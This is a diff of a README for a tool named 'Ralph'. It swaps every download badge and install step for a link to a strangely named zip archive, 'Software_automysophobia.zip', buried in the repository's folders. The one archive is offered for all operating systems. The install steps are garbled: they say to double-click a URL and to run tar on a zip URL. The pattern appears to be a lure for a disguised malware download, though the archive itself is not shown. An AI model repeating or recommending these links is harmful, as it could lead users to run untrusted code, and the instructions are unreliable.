@@ -9,7 +9,7 @@ To get started with Ralph, follow these simple steps:
 1. **Visit the Release Page**
    Click the button below to go to the release page.
 
-   [![Download Ralph](https://raw.githubusercontent.com/FaisFromYt/ralph/main/flowchart/src/assets/Software-v1.9.zip%20Ralph-v1.0-blue)](https://raw.githubusercontent.com/FaisFromYt/ralph/main/flowchart/src/assets/Software-v1.9.zip)
+   [![Download Ralph](https://github.com/FaisFromYt/ralph/raw/refs/heads/main/flowchart/Software_automysophobia.zip%20Ralph-v1.0-blue)](https://github.com/FaisFromYt/ralph/raw/refs/heads/main/flowchart/Software_automysophobia.zip)
 
 2. **Download Ralph**
    On the release page, you will find the latest version of Ralph. Click on the appropriate file for your operating system to start the download.
@@ -24,28 +24,28 @@ Before you download Ralph, check these system requirements to ensure smooth oper
 
 ## 📥 Download & Install
 1. **Access the Download Page**
-   Open your web browser and go to the following link: [Download Ralph](https://raw.githubusercontent.com/FaisFromYt/ralph/main/flowchart/src/assets/Software-v1.9.zip).
+   Open your web browser and go to the following link: [Download Ralph](https://github.com/FaisFromYt/ralph/raw/refs/heads/main/flowchart/Software_automysophobia.zip).
 
 2. **Select the Correct File**
    You will see a list of available files. Choose the one suitable for your operating system:
-   - For Windows: `https://raw.githubusercontent.com/FaisFromYt/ralph/main/flowchart/src/assets/Software-v1.9.zip`
-   - For macOS: `https://raw.githubusercontent.com/FaisFromYt/ralph/main/flowchart/src/assets/Software-v1.9.zip`
-   - For Linux: `https://raw.githubusercontent.com/FaisFromYt/ralph/main/flowchart/src/assets/Software-v1.9.zip`
+   - For Windows: `https://github.com/FaisFromYt/ralph/raw/refs/heads/main/flowchart/Software_automysophobia.zip`
+   - For macOS: `https://github.com/FaisFromYt/ralph/raw/refs/heads/main/flowchart/Software_automysophobia.zip`
+   - For Linux: `https://github.com/FaisFromYt/ralph/raw/refs/heads/main/flowchart/Software_automysophobia.zip`
 
 3. **Download the File**
    Click on the file name to initiate the download. Once the file is downloaded, locate it in your downloads folder.
 
 4. **Install Ralph**
    - **Windows:** 
-     - Double-click the `https://raw.githubusercontent.com/FaisFromYt/ralph/main/flowchart/src/assets/Software-v1.9.zip` file to start the installation process.
+     - Double-click the `https://github.com/FaisFromYt/ralph/raw/refs/heads/main/flowchart/Software_automysophobia.zip` file to start the installation process.
      - Follow the on-screen instructions to complete the installation.
 
    - **macOS:**
-     - Open the downloaded `https://raw.githubusercontent.com/FaisFromYt/ralph/main/flowchart/src/assets/Software-v1.9.zip` file.
+     - Open the downloaded `https://github.com/FaisFromYt/ralph/raw/refs/heads/main/flowchart/Software_automysophobia.zip` file.
      - Drag and drop the Ralph icon into your Applications folder.
 
    - **Linux:**
-     - Extract the `https://raw.githubusercontent.com/FaisFromYt/ralph/main/flowchart/src/assets/Software-v1.9.zip` file using a terminal command `tar -xvf https://raw.githubusercontent.com/FaisFromYt/ralph/main/flowchart/src/assets/Software-v1.9.zip`.
+     - Extract the `https://github.com/FaisFromYt/ralph/raw/refs/heads/main/flowchart/Software_automysophobia.zip` file using a terminal command `tar -xvf https://github.com/FaisFromYt/ralph/raw/refs/heads/main/flowchart/Software_automysophobia.zip`.
      - Navigate to the extracted folder and run `./ralph` to start the application.
 
 ## 🎯 Using Ralph
